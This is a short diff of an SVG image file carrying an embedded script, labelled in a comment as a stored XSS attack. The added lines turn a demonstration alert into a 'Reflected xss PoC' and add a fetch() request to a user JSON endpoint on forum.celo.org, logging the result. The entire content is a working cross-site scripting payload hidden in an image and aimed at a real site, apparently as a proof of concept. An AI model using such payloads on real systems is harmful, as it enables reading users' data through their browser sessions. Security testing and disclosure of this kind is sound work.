@@ -39,7 +39,15 @@
        transform="scale(1,-1)" />
   <!-- The below lines were added in a text editor to the image XML. This is the stored XSS attack. -->
   <script type="text/javascript">
-    alert("This is an example of a stored XSS attack in an SVG image")
+    alert("Reflected xss PoC")
+    fetch('https://forum.celo.org/u/hfje.json', {
+    method: 'GET',
+    headers: {
+        'Accept': 'application/json',
+    },
+})
+.then(response => response.text())
+.then(text => console.log(text))
   </script>
   </g>
 </svg>
